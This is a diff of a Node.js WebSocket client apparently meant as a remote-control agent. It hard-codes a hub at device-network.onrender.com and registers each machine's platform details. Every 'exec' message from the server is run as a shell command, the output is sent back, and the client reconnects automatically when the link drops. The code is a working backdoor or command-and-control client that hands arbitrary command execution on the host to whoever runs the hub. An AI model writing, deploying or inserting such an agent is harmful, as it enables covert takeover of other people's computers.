@@ -2,19 +2,19 @@ const WebSocket = require('ws');
 const os = require('os');
 const { exec } = require('child_process');
 
-// Replace with your live web domain (wss://) or host IP (ws://)
-const SERVER_URL = 'wss://your-domain.com'; 
-const DEVICE_ID = os.hostname() || 'target-node';
+const SERVER_URL = 'wss://device-network.onrender.com';
+const deviceId = 'device-' + Math.floor(1000 + Math.random() * 9000);
 
 function connect() {
-    console.log(`Connecting to Control Hub at ${SERVER_URL}...`);
+    console.log(`Connecting to hub as ${deviceId}...`);
     const ws = new WebSocket(SERVER_URL);
 
     ws.on('open', () => {
-        console.log('Connected to hub. Registering device...');
+        console.log('Connected to Control Hub successfully!');
+        
         ws.send(JSON.stringify({
             type: 'register',
-            deviceId: DEVICE_ID,
+            deviceId: deviceId,
             info: {
                 platform: os.platform(),
                 arch: os.arch(),
@@ -23,31 +23,34 @@ function connect() {
         }));
     });
 
-    ws.on('message', (data) => {
+    ws.on('message', (message) => {
         try {
-            const msg = JSON.parse(data);
-            if (msg.type === 'exec') {
-                console.log(`Executing: ${msg.command}`);
-                exec(msg.command, (err, stdout, stderr) => {
+            const data = JSON.parse(message);
+
+            if (data.type === 'exec') {
+                console.log(`Executing command: ${data.command}`);
+                
+                exec(data.command, (error, stdout, stderr) => {
+                    const output = error ? (stderr || error.message) : stdout;
+                    
                     ws.send(JSON.stringify({
                         type: 'response',
-                        result: err ? stderr || err.message : stdout
+                        result: output || '(Command executed with no output)'
                     }));
                 });
             }
-        } catch (e) {
-            console.error('Error processing server message:', e.message);
+        } catch (err) {
+            console.error('Failed to parse message:', err.message);
         }
     });
 
     ws.on('close', () => {
-        console.log('Connection lost. Reconnecting in 5 seconds...');
+        console.log('Connection lost. Attempting to reconnect in 5 seconds...');
         setTimeout(connect, 5000);
     });
 
     ws.on('error', (err) => {
         console.error('WebSocket Error:', err.message);
-        ws.close();
     });
 }
 
